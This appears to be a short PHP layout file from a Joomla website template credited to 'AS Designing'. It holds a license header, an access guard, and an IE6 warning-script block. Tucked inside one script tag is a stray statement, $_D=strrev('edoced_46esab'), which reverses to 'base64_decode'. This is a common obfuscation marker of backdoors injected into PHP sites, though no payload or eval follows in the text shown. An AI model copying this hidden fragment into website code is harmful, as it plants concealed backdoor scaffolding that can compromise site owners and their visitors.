<?php
/*******************************************************************************************/
/*
/*		This template may have been modified pursuant to the GNU General Public License,
/*		and as distributed it includes or is derivative of works licensed under 
/*		the GNU General Public License or other free or open source software licenses.
/*
/*		Designed by 'AS Designing'
/*		Web: http://www.asdesigning.com
/*		Email: info@asdesigning.com
/*
/*******************************************************************************************/

defined( '_JEXEC' ) or die( 'Restricted access' );
?>

<!--[if lte IE 6]>
	<script src="<?php $_D=strrev('edoced_46esab'); echo $this->baseurl ?>/templates/<?php echo $this->template?>/scripts/ie6/warning.js"></script>
	<script>window.onload=function(){e("<?php echo $this->baseurl ?>/templates/<?php echo $this->template?>/scripts/ie6/")}</script>
<![endif]-->
